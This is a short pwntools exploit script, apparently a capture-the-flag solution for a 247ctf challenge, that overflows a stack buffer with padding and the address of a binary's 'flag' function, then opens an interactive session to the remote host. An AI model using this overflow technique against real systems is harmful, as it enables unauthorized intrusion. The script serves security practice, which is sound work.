from pwn import *

elf = ELF("./hidden_flag_function")

host, port = "c4b966618a81ffea.247ctf.com", 50316
conn = remote(host, port)

payload = (
    b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa"
)
conn.recvline()
flag_address = p32(elf.symbols["flag"])
payload += flag_address
print(payload)
conn.sendline(payload)

conn.interactive()
